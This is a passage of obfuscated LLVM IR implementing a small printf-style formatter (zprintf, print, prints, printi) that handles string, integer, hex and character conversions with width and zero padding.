; <label>:41:                                     ; preds = %32, %28
  %42 = phi i1 [ false, %28 ], [ %40, %32 ]
  br i1 %42, label %43, label %49

; <label>:43:                                     ; preds = %41
  %44 = load i32, i32* %5, align 4
  %45 = sub i32 %44, 1150315029
  %46 = add i32 %45, -1
  %47 = add i32 %46, 1150315029
  %48 = add nsw i32 %44, -1
  store i32 %47, i32* %5, align 4
  br label %28

; <label>:49:                                     ; preds = %41
  %50 = load i32, i32* %4, align 4
  store i32 %50, i32* %3, align 4
  br label %51

; <label>:51:                                     ; preds = %70, %49
  %52 = load i32, i32* %3, align 4
  %53 = load i32, i32* %5, align 4
  %54 = icmp sle i32 %52, %53
  br i1 %54, label %55, label %76

; <label>:55:                                     ; preds = %51
  %56 = load i8*, i8** %2, align 8
  %57 = load i32, i32* %3, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds i8, i8* %56, i64 %58
  %60 = load i8, i8* %59, align 1
  %61 = load i8*, i8** %2, align 8
  %62 = load i32, i32* %3, align 4
  %63 = load i32, i32* %4, align 4
  %64 = add i32 %62, 8020531
  %65 = sub i32 %64, %63
  %66 = sub i32 %65, 8020531
  %67 = sub nsw i32 %62, %63
  %68 = sext i32 %66 to i64
  %69 = getelementptr inbounds i8, i8* %61, i64 %68
  store i8 %60, i8* %69, align 1
  br label %70

; <label>:70:                                     ; preds = %55
  %71 = load i32, i32* %3, align 4
  %72 = sub i32 %71, 55989564
  %73 = add i32 %72, 1
  %74 = add i32 %73, 55989564
  %75 = add nsw i32 %71, 1
  store i32 %74, i32* %3, align 4
  br label %51

; <label>:76:                                     ; preds = %51
  %77 = load i8*, i8** %2, align 8
  %78 = load i32, i32* %3, align 4
  %79 = load i32, i32* %4, align 4
  %80 = sub i32 %78, -1719497779
  %81 = sub i32 %80, %79
  %82 = add i32 %81, -1719497779
  %83 = sub nsw i32 %78, %79
  %84 = sext i32 %82 to i64
  %85 = getelementptr inbounds i8, i8* %77, i64 %84
  store i8 0, i8* %85, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #2

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #4

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %332, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %335

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %320

; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %22
  br label %335

; <label>:30:                                     ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %30
  br label %321

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

; <label>:41:                                     ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

; <label>:44:                                     ; preds = %41, %36
  br label %45

; <label>:45:                                     ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %58

; <label>:50:                                     ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = and i32 %53, 2
  %55 = xor i32 %53, 2
  %56 = or i32 %54, %55
  %57 = or i32 %53, 2
  store i32 %56, i32* %8, align 4
  br label %45

; <label>:58:                                     ; preds = %45
  br label %59

; <label>:59:                                     ; preds = %85, %58
  %60 = load i8*, i8** %5, align 8
  %61 = load i8, i8* %60, align 1
  %62 = zext i8 %61 to i32
  %63 = icmp sge i32 %62, 48
  br i1 %63, label %64, label %69

; <label>:64:                                     ; preds = %59
  %65 = load i8*, i8** %5, align 8
  %66 = load i8, i8* %65, align 1
  %67 = zext i8 %66 to i32
  %68 = icmp sle i32 %67, 57
  br label %69

; <label>:69:                                     ; preds = %64, %59
  %70 = phi i1 [ false, %59 ], [ %68, %64 ]
  br i1 %70, label %71, label %88

; <label>:71:                                     ; preds = %69
  %72 = load i32, i32* %7, align 4
  %73 = mul nsw i32 %72, 10
  store i32 %73, i32* %7, align 4
  %74 = load i8*, i8** %5, align 8
  %75 = load i8, i8* %74, align 1
  %76 = zext i8 %75 to i32
  %77 = sub i32 %76, 1579743492
  %78 = sub i32 %77, 48
  %79 = add i32 %78, 1579743492
  %80 = sub nsw i32 %76, 48
  %81 = load i32, i32* %7, align 4
  %82 = sub i32 0, %79
  %83 = sub i32 %81, %82
  %84 = add nsw i32 %81, %79
  store i32 %83, i32* %7, align 4
  br label %85

; <label>:85:                                     ; preds = %71
  %86 = load i8*, i8** %5, align 8
  %87 = getelementptr inbounds i8, i8* %86, i32 1
  store i8* %87, i8** %5, align 8
  br label %59

; <label>:88:                                     ; preds = %69
  %89 = load i8*, i8** %5, align 8
  %90 = load i8, i8* %89, align 1
  %91 = zext i8 %90 to i32
  %92 = icmp eq i32 %91, 115
  br i1 %92, label %93, label %135

; <label>:93:                                     ; preds = %88
  %94 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %95 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %94, i32 0, i32 0
  %96 = load i32, i32* %95, align 8
  %97 = icmp ule i32 %96, 40
  br i1 %97, label %98, label %108

; <label>:98:                                     ; preds = %93
  %99 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %94, i32 0, i32 3
  %100 = load i8*, i8** %99, align 8
  %101 = getelementptr i8, i8* %100, i32 %96
  %102 = bitcast i8* %101 to i32*
  %103 = sub i32 0, %96
  %104 = sub i32 0, 8
  %105 = add i32 %103, %104
  %106 = sub i32 0, %105
  %107 = add i32 %96, 8
  store i32 %106, i32* %95, align 8
  br label %113

; <label>:108:                                    ; preds = %93
  %109 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %94, i32 0, i32 2
  %110 = load i8*, i8** %109, align 8
  %111 = bitcast i8* %110 to i32*
  %112 = getelementptr i8, i8* %110, i32 8
  store i8* %112, i8** %109, align 8
  br label %113

; <label>:113:                                    ; preds = %108, %98
  %114 = phi i32* [ %102, %98 ], [ %111, %108 ]
  %115 = load i32, i32* %114, align 4
  %116 = sext i32 %115 to i64
  %117 = inttoptr i64 %116 to i8*
  store i8* %117, i8** %11, align 8
  %118 = load i8**, i8*** %4, align 8
  %119 = load i8*, i8** %11, align 8
  %120 = icmp ne i8* %119, null
  br i1 %120, label %121, label %123

; <label>:121:                                    ; preds = %113
  %122 = load i8*, i8** %11, align 8
  br label %124

; <label>:123:                                    ; preds = %113
  br label %124

; <label>:124:                                    ; preds = %123, %121
  %125 = phi i8* [ %122, %121 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.88, i32 0, i32 0), %123 ]
  %126 = load i32, i32* %7, align 4
  %127 = load i32, i32* %8, align 4
  %128 = call i32 @prints(i8** %118, i8* %125, i32 %126, i32 %127)
  %129 = load i32, i32* %9, align 4
  %130 = sub i32 0, %129
  %131 = sub i32 0, %128
  %132 = add i32 %130, %131
  %133 = sub i32 0, %132
  %134 = add nsw i32 %129, %128
  store i32 %133, i32* %9, align 4
  br label %332

; <label>:135:                                    ; preds = %88
  %136 = load i8*, i8** %5, align 8
  %137 = load i8, i8* %136, align 1
  %138 = zext i8 %137 to i32
  %139 = icmp eq i32 %138, 100
  br i1 %139, label %140, label %170

; <label>:140:                                    ; preds = %135
  %141 = load i8**, i8*** %4, align 8
  %142 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %143 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %142, i32 0, i32 0
  %144 = load i32, i32* %143, align 8
  %145 = icmp ule i32 %144, 40
  br i1 %145, label %146, label %154

; <label>:146:                                    ; preds = %140
  %147 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %142, i32 0, i32 3
  %148 = load i8*, i8** %147, align 8
  %149 = getelementptr i8, i8* %148, i32 %144
  %150 = bitcast i8* %149 to i32*
  %151 = sub i32 0, 8
  %152 = sub i32 %144, %151
  %153 = add i32 %144, 8
  store i32 %152, i32* %143, align 8
  br label %159

; <label>:154:                                    ; preds = %140
  %155 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %142, i32 0, i32 2
  %156 = load i8*, i8** %155, align 8
  %157 = bitcast i8* %156 to i32*
  %158 = getelementptr i8, i8* %156, i32 8
  store i8* %158, i8** %155, align 8
  br label %159

; <label>:159:                                    ; preds = %154, %146
  %160 = phi i32* [ %150, %146 ], [ %157, %154 ]
  %161 = load i32, i32* %160, align 4
  %162 = load i32, i32* %7, align 4
  %163 = load i32, i32* %8, align 4
  %164 = call i32 @printi(i8** %141, i32 %161, i32 10, i32 1, i32 %162, i32 %163, i32 97)
  %165 = load i32, i32* %9, align 4
  %166 = sub i32 %165, 743648697
  %167 = add i32 %166, %164
  %168 = add i32 %167, 743648697
  %169 = add nsw i32 %165, %164
  store i32 %168, i32* %9, align 4
  br label %332

; <label>:170:                                    ; preds = %135
  %171 = load i8*, i8** %5, align 8
  %172 = load i8, i8* %171, align 1
  %173 = zext i8 %172 to i32
  %174 = icmp eq i32 %173, 120
  br i1 %174, label %175, label %207

; <label>:175:                                    ; preds = %170
  %176 = load i8**, i8*** %4, align 8
  %177 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %178 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %177, i32 0, i32 0
  %179 = load i32, i32* %178, align 8
  %180 = icmp ule i32 %179, 40
  br i1 %180, label %181, label %190

; <label>:181:                                    ; preds = %175
  %182 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %177, i32 0, i32 3
  %183 = load i8*, i8** %182, align 8
  %184 = getelementptr i8, i8* %183, i32 %179
  %185 = bitcast i8* %184 to i32*
  %186 = sub i32 %179, 546915357
  %187 = add i32 %186, 8
  %188 = add i32 %187, 546915357
  %189 = add i32 %179, 8
  store i32 %188, i32* %178, align 8
  br label %195

; <label>:190:                                    ; preds = %175
  %191 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %177, i32 0, i32 2
  %192 = load i8*, i8** %191, align 8
  %193 = bitcast i8* %192 to i32*
  %194 = getelementptr i8, i8* %192, i32 8
  store i8* %194, i8** %191, align 8
  br label %195

; <label>:195:                                    ; preds = %190, %181
  %196 = phi i32* [ %185, %181 ], [ %193, %190 ]
  %197 = load i32, i32* %196, align 4
  %198 = load i32, i32* %7, align 4
  %199 = load i32, i32* %8, align 4
  %200 = call i32 @printi(i8** %176, i32 %197, i32 16, i32 0, i32 %198, i32 %199, i32 97)
  %201 = load i32, i32* %9, align 4
  %202 = sub i32 0, %201
  %203 = sub i32 0, %200
  %204 = add i32 %202, %203
  %205 = sub i32 0, %204
  %206 = add nsw i32 %201, %200
  store i32 %205, i32* %9, align 4
  br label %332

; <label>:207:                                    ; preds = %170
  %208 = load i8*, i8** %5, align 8
  %209 = load i8, i8* %208, align 1
  %210 = zext i8 %209 to i32
  %211 = icmp eq i32 %210, 88
  br i1 %211, label %212, label %243

; <label>:212:                                    ; preds = %207
  %213 = load i8**, i8*** %4, align 8
  %214 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %215 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %214, i32 0, i32 0
  %216 = load i32, i32* %215, align 8
  %217 = icmp ule i32 %216, 40
  br i1 %217, label %218, label %226

; <label>:218:                                    ; preds = %212
  %219 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %214, i32 0, i32 3
  %220 = load i8*, i8** %219, align 8
  %221 = getelementptr i8, i8* %220, i32 %216
  %222 = bitcast i8* %221 to i32*
  %223 = sub i32 0, 8
  %224 = sub i32 %216, %223
  %225 = add i32 %216, 8
  store i32 %224, i32* %215, align 8
  br label %231

; <label>:226:                                    ; preds = %212
  %227 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %214, i32 0, i32 2
  %228 = load i8*, i8** %227, align 8
  %229 = bitcast i8* %228 to i32*
  %230 = getelementptr i8, i8* %228, i32 8
  store i8* %230, i8** %227, align 8
  br label %231

; <label>:231:                                    ; preds = %226, %218
  %232 = phi i32* [ %222, %218 ], [ %229, %226 ]
  %233 = load i32, i32* %232, align 4
  %234 = load i32, i32* %7, align 4
  %235 = load i32, i32* %8, align 4
  %236 = call i32 @printi(i8** %213, i32 %233, i32 16, i32 0, i32 %234, i32 %235, i32 65)
  %237 = load i32, i32* %9, align 4
  %238 = sub i32 0, %237
  %239 = sub i32 0, %236
  %240 = add i32 %238, %239
  %241 = sub i32 0, %240
  %242 = add nsw i32 %237, %236
  store i32 %241, i32* %9, align 4
  br label %332

; <label>:243:                                    ; preds = %207
  %244 = load i8*, i8** %5, align 8
  %245 = load i8, i8* %244, align 1
  %246 = zext i8 %245 to i32
  %247 = icmp eq i32 %246, 117
  br i1 %247, label %248, label %280

; <label>:248:                                    ; preds = %243
  %249 = load i8**, i8*** %4, align 8
  %250 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %251 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %250, i32 0, i32 0
  %252 = load i32, i32* %251, align 8
  %253 = icmp ule i32 %252, 40
  br i1 %253, label %254, label %264

; <label>:254:                                    ; preds = %248
  %255 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %250, i32 0, i32 3
  %256 = load i8*, i8** %255, align 8
  %257 = getelementptr i8, i8* %256, i32 %252
  %258 = bitcast i8* %257 to i32*
  %259 = sub i32 0, %252
  %260 = sub i32 0, 8
  %261 = add i32 %259, %260
  %262 = sub i32 0, %261
  %263 = add i32 %252, 8
  store i32 %262, i32* %251, align 8
  br label %269

; <label>:264:                                    ; preds = %248
  %265 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %250, i32 0, i32 2
  %266 = load i8*, i8** %265, align 8
  %267 = bitcast i8* %266 to i32*
  %268 = getelementptr i8, i8* %266, i32 8
  store i8* %268, i8** %265, align 8
  br label %269

; <label>:269:                                    ; preds = %264, %254
  %270 = phi i32* [ %258, %254 ], [ %267, %264 ]
  %271 = load i32, i32* %270, align 4
  %272 = load i32, i32* %7, align 4
  %273 = load i32, i32* %8, align 4
  %274 = call i32 @printi(i8** %249, i32 %271, i32 10, i32 0, i32 %272, i32 %273, i32 97)
  %275 = load i32, i32* %9, align 4
  %276 = add i32 %275, 215068929
  %277 = add i32 %276, %274
  %278 = sub i32 %277, 215068929
  %279 = add nsw i32 %275, %274
  store i32 %278, i32* %9, align 4
  br label %332

; <label>:280:                                    ; preds = %243
  %281 = load i8*, i8** %5, align 8
  %282 = load i8, i8* %281, align 1
  %283 = zext i8 %282 to i32
  %284 = icmp eq i32 %283, 99
  br i1 %284, label %285, label %319

; <label>:285:                                    ; preds = %280
  %286 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %287 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %286, i32 0, i32 0
  %288 = load i32, i32* %287, align 8
  %289 = icmp ule i32 %288, 40
  br i1 %289, label %290, label %298

; <label>:290:                                    ; preds = %285
  %291 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %286, i32 0, i32 3
  %292 = load i8*, i8** %291, align 8
  %293 = getelementptr i8, i8* %292, i32 %288
  %294 = bitcast i8* %293 to i32*
  %295 = sub i32 0, 8
  %296 = sub i32 %288, %295
  %297 = add i32 %288, 8
  store i32 %296, i32* %287, align 8
  br label %303

; <label>:298:                                    ; preds = %285
  %299 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %286, i32 0, i32 2
  %300 = load i8*, i8** %299, align 8
  %301 = bitcast i8* %300 to i32*
  %302 = getelementptr i8, i8* %300, i32 8
  store i8* %302, i8** %299, align 8
  br label %303

; <label>:303:                                    ; preds = %298, %290
  %304 = phi i32* [ %294, %290 ], [ %301, %298 ]
  %305 = load i32, i32* %304, align 4
  %306 = trunc i32 %305 to i8
  %307 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %306, i8* %307, align 1
  %308 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %308, align 1
  %309 = load i8**, i8*** %4, align 8
  %310 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %311 = load i32, i32* %7, align 4
  %312 = load i32, i32* %8, align 4
  %313 = call i32 @prints(i8** %309, i8* %310, i32 %311, i32 %312)
  %314 = load i32, i32* %9, align 4
  %315 = add i32 %314, 789436933
  %316 = add i32 %315, %313
  %317 = sub i32 %316, 789436933
  %318 = add nsw i32 %314, %313
  store i32 %317, i32* %9, align 4
  br label %332

; <label>:319:                                    ; preds = %280
  br label %331

; <label>:320:                                    ; preds = %17
  br label %321

; <label>:321:                                    ; preds = %320, %35
  %322 = load i8**, i8*** %4, align 8
  %323 = load i8*, i8** %5, align 8
  %324 = load i8, i8* %323, align 1
  %325 = zext i8 %324 to i32
  call void @printchar(i8** %322, i32 %325)
  %326 = load i32, i32* %9, align 4
  %327 = add i32 %326, -1506518292
  %328 = add i32 %327, 1
  %329 = sub i32 %328, -1506518292
  %330 = add nsw i32 %326, 1
  store i32 %329, i32* %9, align 4
  br label %331

; <label>:331:                                    ; preds = %321, %319
  br label %332

; <label>:332:                                    ; preds = %331, %303, %269, %231, %195, %159, %124
  %333 = load i8*, i8** %5, align 8
  %334 = getelementptr inbounds i8, i8* %333, i32 1
  store i8* %334, i8** %5, align 8
  br label %12

; <label>:335:                                    ; preds = %29, %12
  %336 = load i8**, i8*** %4, align 8
  %337 = icmp ne i8** %336, null
  br i1 %337, label %338, label %341

; <label>:338:                                    ; preds = %335
  %339 = load i8**, i8*** %4, align 8
  %340 = load i8*, i8** %339, align 8
  store i8 0, i8* %340, align 1
  br label %341

; <label>:341:                                    ; preds = %338, %335
  %342 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %343 = bitcast %struct.__va_list_tag* %342 to i8*
  call void @llvm.va_end(i8* %343)
  %344 = load i32, i32* %9, align 4
  ret i32 %344
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %52

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %28, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %31

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = sub i32 0, %22
  %24 = sub i32 0, 1
  %25 = add i32 %23, %24
  %26 = sub i32 0, %25
  %27 = add nsw i32 %22, 1
  store i32 %26, i32* %11, align 4
  br label %28

; <label>:28:                                     ; preds = %21
  %29 = load i8*, i8** %12, align 8
  %30 = getelementptr inbounds i8, i8* %29, i32 1
  store i8* %30, i8** %12, align 8
  br label %17

; <label>:31:                                     ; preds = %17
  %32 = load i32, i32* %11, align 4
  %33 = load i32, i32* %7, align 4
  %34 = icmp sge i32 %32, %33
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %31
  store i32 0, i32* %7, align 4
  br label %43

; <label>:36:                                     ; preds = %31
  %37 = load i32, i32* %11, align 4
  %38 = load i32, i32* %7, align 4
  %39 = sub i32 %38, 1490124928
  %40 = sub i32 %39, %37
  %41 = add i32 %40, 1490124928
  %42 = sub nsw i32 %38, %37
  store i32 %41, i32* %7, align 4
  br label %43

; <label>:43:                                     ; preds = %36, %35
  %44 = load i32, i32* %8, align 4
  %45 = xor i32 2, -1
  %46 = xor i32 %44, %45
  %47 = and i32 %46, %44
  %48 = and i32 %44, 2
  %49 = icmp ne i32 %47, 0
  br i1 %49, label %50, label %51

; <label>:50:                                     ; preds = %43
  store i32 48, i32* %10, align 4
  br label %51

; <label>:51:                                     ; preds = %50, %43
  br label %52

; <label>:52:                                     ; preds = %51, %4
  %53 = load i32, i32* %8, align 4
  %54 = xor i32 %53, -1
  %55 = xor i32 1, -1
  %56 = xor i32 -539513972, -1
  %57 = or i32 %54, %55
  %58 = or i32 -539513972, %56
  %59 = xor i32 %57, -1
  %60 = and i32 %59, %58
  %61 = and i32 %53, 1
  %62 = icmp ne i32 %60, 0
  br i1 %62, label %83, label %63

; <label>:63:                                     ; preds = %52
  br label %64

; <label>:64:                                     ; preds = %75, %63
  %65 = load i32, i32* %7, align 4
  %66 = icmp sgt i32 %65, 0
  br i1 %66, label %67, label %82

; <label>:67:                                     ; preds = %64
  %68 = load i8**, i8*** %5, align 8
  %69 = load i32, i32* %10, align 4
  call void @printchar(i8** %68, i32 %69)
  %70 = load i32, i32* %9, align 4
  %71 = add i32 %70, -365791528
  %72 = add i32 %71, 1
  %73 = sub i32 %72, -365791528
  %74 = add nsw i32 %70, 1
  store i32 %73, i32* %9, align 4
  br label %75

; <label>:75:                                     ; preds = %67
  %76 = load i32, i32* %7, align 4
  %77 = sub i32 0, %76
  %78 = sub i32 0, -1
  %79 = add i32 %77, %78
  %80 = sub i32 0, %79
  %81 = add nsw i32 %76, -1
  store i32 %80, i32* %7, align 4
  br label %64

; <label>:82:                                     ; preds = %64
  br label %83

; <label>:83:                                     ; preds = %82, %52
  br label %84

; <label>:84:                                     ; preds = %98, %83
  %85 = load i8*, i8** %6, align 8
  %86 = load i8, i8* %85, align 1
  %87 = icmp ne i8 %86, 0
  br i1 %87, label %88, label %101

; <label>:88:                                     ; preds = %84
  %89 = load i8**, i8*** %5, align 8
  %90 = load i8*, i8** %6, align 8
  %91 = load i8, i8* %90, align 1
  %92 = zext i8 %91 to i32
  call void @printchar(i8** %89, i32 %92)
  %93 = load i32, i32* %9, align 4
  %94 = sub i32 %93, -1820292947
  %95 = add i32 %94, 1
  %96 = add i32 %95, -1820292947
  %97 = add nsw i32 %93, 1
  store i32 %96, i32* %9, align 4
  br label %98

; <label>:98:                                     ; preds = %88
  %99 = load i8*, i8** %6, align 8
  %100 = getelementptr inbounds i8, i8* %99, i32 1
  store i8* %100, i8** %6, align 8
  br label %84

; <label>:101:                                    ; preds = %84
  br label %102

; <label>:102:                                    ; preds = %112, %101
  %103 = load i32, i32* %7, align 4
  %104 = icmp sgt i32 %103, 0
  br i1 %104, label %105, label %118

; <label>:105:                                    ; preds = %102
  %106 = load i8**, i8*** %5, align 8
  %107 = load i32, i32* %10, align 4
  call void @printchar(i8** %106, i32 %107)
  %108 = load i32, i32* %9, align 4
  %109 = sub i32 0, 1
  %110 = sub i32 %108, %109
  %111 = add nsw i32 %108, 1
  store i32 %110, i32* %9, align 4
  br label %112

; <label>:112:                                    ; preds = %105
  %113 = load i32, i32* %7, align 4
  %114 = add i32 %113, 313127708
  %115 = add i32 %114, -1
  %116 = sub i32 %115, 313127708
  %117 = add nsw i32 %113, -1
  store i32 %116, i32* %7, align 4
  br label %102

; <label>:118:                                    ; preds = %102
  %119 = load i32, i32* %9, align 4
  ret i32 %119
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %129

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %48

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %48

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %48

; <label>:42:                                     ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = sub i32 0, 857213970
  %45 = sub i32 %44, %43
  %46 = add i32 %45, 857213970
  %47 = sub nsw i32 0, %43
  store i32 %46, i32* %21, align 4
  br label %48

; <label>:48:                                     ; preds = %42, %39, %36, %33
  %49 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %50 = getelementptr inbounds i8, i8* %49, i64 12
  %51 = getelementptr inbounds i8, i8* %50, i64 -1
  store i8* %51, i8** %17, align 8
  %52 = load i8*, i8** %17, align 8
  store i8 0, i8* %52, align 1
  br label %53

; <label>:53:                                     ; preds = %77, %48
  %54 = load i32, i32* %21, align 4
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %56, label %89

; <label>:56:                                     ; preds = %53
  %57 = load i32, i32* %21, align 4
  %58 = load i32, i32* %11, align 4
  %59 = urem i32 %57, %58
  store i32 %59, i32* %18, align 4
  %60 = load i32, i32* %18, align 4
  %61 = icmp sge i32 %60, 10
  br i1 %61, label %62, label %77

; <label>:62:                                     ; preds = %56
  %63 = load i32, i32* %15, align 4
  %64 = sub i32 0, 48
  %65 = add i32 %63, %64
  %66 = sub nsw i32 %63, 48
  %67 = sub i32 %65, 103920584
  %68 = sub i32 %67, 10
  %69 = add i32 %68, 103920584
  %70 = sub nsw i32 %65, 10
  %71 = load i32, i32* %18, align 4
  %72 = sub i32 0, %71
  %73 = sub i32 0, %69
  %74 = add i32 %72, %73
  %75 = sub i32 0, %74
  %76 = add nsw i32 %71, %69
  store i32 %75, i32* %18, align 4
  br label %77

; <label>:77:                                     ; preds = %62, %56
  %78 = load i32, i32* %18, align 4
